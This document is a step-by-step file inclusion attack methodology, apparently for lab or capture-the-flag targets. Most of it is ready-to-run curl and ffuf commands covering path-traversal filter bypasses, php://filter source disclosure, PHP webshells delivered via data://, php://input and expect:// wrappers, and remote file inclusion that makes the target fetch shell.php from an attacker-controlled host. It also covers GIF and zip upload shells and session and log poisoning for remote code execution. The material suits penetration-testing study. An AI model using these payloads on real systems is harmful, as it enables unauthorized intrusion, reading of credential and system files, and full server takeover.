# File Inclusion Methodology

**Core concept:** User-controlled input passed to a file-loading function without sanitization. Leads to arbitrary file read, source code disclosure, and RCE (if execute-capable function is used).

**Read vs Execute vs Remote URL — matters for attack path:**

| Function | Read | Execute | Remote URL |
|----------|------|---------|------------|
| PHP `include()/include_once()` | ✅ | ✅ | ✅ |
| PHP `require()/require_once()` | ✅ | ✅ | ❌ |
| PHP `file_get_contents()` | ✅ | ❌ | ✅ |
| PHP `fopen()/file()` | ✅ | ❌ | ❌ |
| NodeJS `res.render()` | ✅ | ✅ | ❌ |
| Java `import` | ✅ | ✅ | ✅ |
| .NET `include` | ✅ | ✅ | ✅ |

**How to identify the function:** If the LFI parameter is in an image/file-serving endpoint, it likely uses `file_get_contents()` or `readfile()` (read-only). Use `php://filter` or the read-only LFI itself to read the PHP source and confirm. A read-only LFI is still valuable — use it for source disclosure to find a second `include()`-based LFI elsewhere in the app.

---

## Phase 1 — Identify the Vulnerability

```bash
# Check page source for LFI pattern (language/page/view param)
curl -s http://<TARGET>/ | grep -i "language\|page\|view\|file\|path"

# Try direct inclusion
curl -s "http://<TARGET>/index.php?language=/etc/passwd" | grep root

# Try path traversal (4 levels covers most webroot depths)
curl -s "http://<TARGET>/index.php?language=../../../../etc/passwd" | grep root

# Fuzz for hidden parameters
ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ \
  -u "http://<TARGET>/index.php?FUZZ=value" -fs <BASELINE_SIZE> -t 100 -s
```

**Get two sizes:** baseline (default content) AND failed-include (nonexistent file). Filter both when fuzzing.

---

## Phase 2 — Basic LFI

### Absolute Path (no prefix)
```bash
?language=/etc/passwd
?language=/var/www/html/index.php
```

### Path Traversal (prefix appended)
```bash
?language=../../../../etc/passwd
# Add more ../ until it works — extra ones are harmless (/ stays at /)
```

### Approved Path + Traversal (regex filter)
```bash
# Check nav links for exact approved prefix: e.g. "languages/en.php"
?language=languages/../../../../etc/passwd
```

---

## Phase 3 — Bypass Filters

### Non-Recursive `../` Removal
```bash
# str_replace('../', '', $input) runs once — not recursive
?language=....//....//....//....//etc/passwd
# ....// → after removing ../ → ../  ✓
```

### URL Encoding
```bash
# Encode all chars including dots
?language=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd

# Double encode — for "check then urldecode" pattern:
# PHP auto-decodes $_GET once (%252F → %2F in $_GET), filter sees no literal / → passes,
# then urldecode($_GET[...]) → / is used in the include path
?language=%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%2fpasswd
```

### Approved Path + Non-Recursive Filter (combined)
```bash
?language=languages/....//....//....//....//etc/passwd
```

---

## Phase 4 — Source Disclosure via Read-Only LFI

When LFI uses `file_get_contents()` or `readfile()`, PHP files are returned as raw source (not executed). Use this to read all PHP files in the app and locate an `include()`-based LFI.

```bash
# Read PHP source directly (returned as raw text, not executed)
curl -s "http://<TARGET>/api/image.php?p=....//index.php"
curl -s "http://<TARGET>/api/image.php?p=....//contact.php"
curl -s "http://<TARGET>/api/image.php?p=....//api/application.php"

# Read webserver config to find denied dirs, upload paths, PHP version
curl -s "http://<TARGET>/api/image.php?p=....//....//....//....//etc/nginx/sites-enabled/default"
curl -s "http://<TARGET>/api/image.php?p=....//....//....//....//etc/apache2/apache2.conf"

# What to look for in source:
# - include() / require() calls with user-controlled params → second LFI
# - Upload handlers: how files are named (md5_file()? random? original name?)
# - Denied directories from nginx/apache config
# - PHP version (informs which wrappers work)
```

---

## Phase 5 — PHP Filters (Source Code via php://filter)

```bash
# Fuzz for PHP files first
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ \
  -u "http://<TARGET>/FUZZ.php" -mc 200,301,302,403 -t 100 -s

# Read source without executing (omit .php — it gets appended automatically)
curl -s "http://<TARGET>/index.php?language=php://filter/read=convert.base64-encode/resource=config" \
  | grep -oP '[A-Za-z0-9+/=]{50,}' | base64 -d

# Read file at absolute path (with extension in resource)
curl -s "http://<TARGET>/index.php?language=php://filter/read=convert.base64-encode/resource=/etc/php/7.4/apache2/php.ini" \
  | grep -oP '[A-Za-z0-9+/=]{100,}' | base64 -d | grep allow_url_include
```

**Why base64:** PHP source contains `<?php` which would execute instead of display. Base64 filter returns encoded string instead.

---

## Phase 6 — PHP Wrappers (RCE)

### Check Prerequisites
```bash
# Check allow_url_include (needed for data:// and php://input)
curl -s "http://<TARGET>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini" \
  | grep -oP '[A-Za-z0-9+/=]{100,}' | base64 -d 2>/dev/null | grep allow_url_include
```

### data:// Wrapper
```bash
# Base64-encode the webshell first
echo '<?php system($_GET["cmd"]); ?>' | base64
# → PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==

curl -s "http://<TARGET>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==&cmd=id"
```

### php://input Wrapper
```bash
# POST the webshell as request body, pass cmd as GET param
curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' \
  "http://<TARGET>/index.php?language=php://input&cmd=id" | grep uid
```

### expect:// Wrapper (if enabled)
```bash
curl -s "http://<TARGET>/index.php?language=expect://id" | grep uid
```

**Fallback order:** `php://input` → `data://` → `expect://`

---

## Phase 7 — Remote File Inclusion (RFI)

### Verify RFI Works
```bash
# Include local URL first (avoids firewall blocks during test)
curl -s "http://<TARGET>/index.php?language=http://127.0.0.1:80/index.php"
# If page content appears in LFI area → RFI confirmed
```

### RFI via HTTP
```bash
# Setup
echo '<?php system($_GET["cmd"]); ?>' > /tmp/shell.php
cd /tmp && python3 -m http.server <PORT> &

# Execute
curl -s "http://<TARGET>/index.php?language=http://<OUR_IP>:<PORT>/shell.php&cmd=id" | grep uid
```

### RFI via FTP
```bash
sudo python -m pyftpdlib -p 21
curl -s "http://<TARGET>/index.php?language=ftp://<OUR_IP>/shell.php&cmd=id"
```

### Find the flag
```bash
# Find flag files
curl -s "http://<TARGET>/index.php?language=http://<OUR_IP>:<PORT>/shell.php&cmd=find+/+-maxdepth+2+-name+'*.txt'+2>/dev/null" \
  | python3 -c "import sys,re; print(re.findall(r'Containers</h2>(.*?)<p', sys.stdin.read(), re.S))"

# Read flag
curl -s "http://<TARGET>/index.php?language=http://<OUR_IP>:<PORT>/shell.php&cmd=cat+/FLAG_FILE"
```

---

## Phase 8 — LFI + File Upload (RCE)

**Before uploading:** Read the upload handler source (via source disclosure LFI or php://filter) to determine:
- What field name the form uses (`<input name="...">`)
- Where files are stored and what they're named:
  - Original filename preserved → use that filename in LFI path
  - `md5_file($tmp_name)` → hash of file CONTENT; compute locally with `md5sum /tmp/shell.ext`
  - Random/UUID → may need to find the path from the upload response or a directory listing
- Whether `include()` appends an extension (e.g. `.php`) — if so, omit it from the LFI traversal

### Malicious Image Upload
```bash
# Create image with embedded webshell (GIF8 magic bytes bypass content-type checks)
echo 'GIF8<?php system($_GET["cmd"]); ?>' > /tmp/shell.gif

# Find upload form fields
curl -s "http://<TARGET>/apply.php" | grep -i "input\|form\|name="

# Upload (use correct field name from form source)
curl -s -F "uploadFile=@/tmp/shell.gif" "http://<TARGET>/upload.php"

# If server uses md5_file() naming — compute hash from the file you uploaded
md5sum /tmp/shell.gif
# Use that hash as the filename in the LFI path

# LFI include the uploaded file
curl -s "http://<TARGET>/index.php?language=./profile_images/shell.gif&cmd=id" | grep uid
```

### Zip Upload
```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php
# Upload shell.jpg, then:
curl -s "http://<TARGET>/index.php?language=zip://./profile_images/shell.jpg%23shell.php&cmd=id"
```

---

## Phase 9 — Log Poisoning (RCE)

### PHP Session Poisoning
```bash
# Get session cookie
curl -s -c /tmp/cookies.txt "http://<TARGET>/index.php" > /dev/null
SESSID=$(grep PHPSESSID /tmp/cookies.txt | awk '{print $NF}')

# Poison session (single quotes prevent bash variable expansion of $_GET)
curl -s -b /tmp/cookies.txt -G --data-urlencode 'language=<?php system($_GET["cmd"]); ?>' \
  "http://<TARGET>/index.php" > /dev/null

# Include poisoned session and execute (do immediately after poison)
curl -s -b /tmp/cookies.txt \
  "http://<TARGET>/index.php?language=/var/lib/php/sessions/sess_$SESSID&cmd=id" \
  | python3 -c "import sys,re; print(re.findall(r'Containers</h2>(.*?)<p', sys.stdin.read(), re.S))"
```

**Key:** Session is written to disk at END of request. On the include request, the session file still has PHP code from the previous request when include() reads it from disk. Re-poison before EVERY command (include request overwrites the session).

### Apache/Nginx Log Poisoning
```bash
# Verify log is readable
curl -s "http://<TARGET>/index.php?language=/var/log/apache2/access.log" | grep -A3 "Containers</h2>"

# Poison User-Agent (Apache: high priv needed; Nginx: readable by www-data)
curl -s "http://<TARGET>/index.php" -H 'User-Agent: <?php system($_GET["cmd"]); ?>'

# Include poisoned log
curl -s "http://<TARGET>/index.php?language=/var/log/apache2/access.log&cmd=id" | grep uid
curl -s "http://<TARGET>/index.php?language=/var/log/nginx/access.log&cmd=id" | grep uid
```

### /proc/self/environ (single-request attack)
```bash
# Poison + include in ONE request — User-Agent is in current process environment
curl -s "http://<TARGET>/index.php?language=/proc/self/environ&cmd=id" \
  -H 'User-Agent: <?php system($_GET["cmd"]); ?>'
```

---

## Phase 10 — Automated Scanning

```bash
# 1. Get baseline size (default content)
curl -s "http://<TARGET>/index.php" | wc -c

# 2. Get failed-include size (nonexistent file)
curl -s "http://<TARGET>/index.php?<PARAM>=nonexistent" | wc -c

# 3. Fuzz hidden parameters
ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ \
  -u "http://<TARGET>/index.php?FUZZ=value" -fs <BASELINE> -t 100 -s

# 4. Fuzz LFI payloads (filter BOTH sizes)
ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ \
  -u "http://<TARGET>/index.php?<PARAM>=FUZZ" -fs <BASELINE>,<FAILED_INCLUDE> -t 100 -s

# 5. Fuzz log/config file paths
ffuf -w ./LFI-WordList-Linux:FUZZ \
  -u "http://<TARGET>/index.php?<PARAM>=../../../../FUZZ" -fs <BASELINE>,<FAILED_INCLUDE> -t 100 -s
```

---

## Decision Flow

```
Found LFI parameter?
  └─ Can read /etc/passwd? → YES: basic LFI works
  └─ Cannot? → Filter in place:
       └─ "Illegal path" error? → approved path filter
            └─ Prefix with approved path (check nav links!)
       └─ Empty response? → str_replace('../') filter
            └─ Use ....// instead of ../
       └─ Still blocked? → URL encode, then double URL encode
            (double encode for "check-then-urldecode" pattern)

Determine LFI function capability:
  └─ Read PHP source (via php://filter or read-only LFI path)
  └─ file_get_contents() / readfile() → READ ONLY
       └─ Use for source disclosure: read all .php files + webserver config
       └─ Look for include()/require() with user-controlled params elsewhere
       └─ Look for upload handler: how are files named? (md5_file? original? random?)
  └─ include() / require() → CAN EXECUTE PHP → proceed to RCE

Goal is RCE (via include/require LFI)?
  └─ Check allow_url_include via php://filter on php.ini
       └─ ON → try php://input, then data://, then expect://
  └─ Can upload files?
       └─ YES → GIF8 magic bytes + PHP shell → LFI include
       └─ Check upload handler source for file naming scheme
            └─ md5_file() → compute hash locally: md5sum /tmp/shell.ext
            └─ Extension appended by include()? → omit ext from traversal
  └─ Can poison a log?
       └─ Try session file (most reliable)
       └─ Try Nginx access.log (readable by www-data)
       └─ Try Apache access.log (may need high priv)
       └─ Try /proc/self/environ (single-request, no prior poison needed)
  └─ RFI available?
       └─ Try HTTP → FTP → SMB (Windows)
```
